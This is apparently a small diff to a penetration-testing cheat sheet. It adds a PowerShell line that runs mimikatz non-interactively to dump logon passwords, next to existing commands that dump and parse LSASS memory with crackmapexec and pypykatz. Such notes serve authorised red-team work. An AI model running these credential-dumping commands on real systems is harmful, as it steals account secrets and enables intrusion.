@@ -127,6 +127,11 @@ whoami /priv
 crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
 pypykatz lsa minidump lsass.DMP
 ```
+run in a non-interactive shell
+```powershell
+$results = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+echo $results
+```
 
 Add domain NB name to /etc/hosts
 
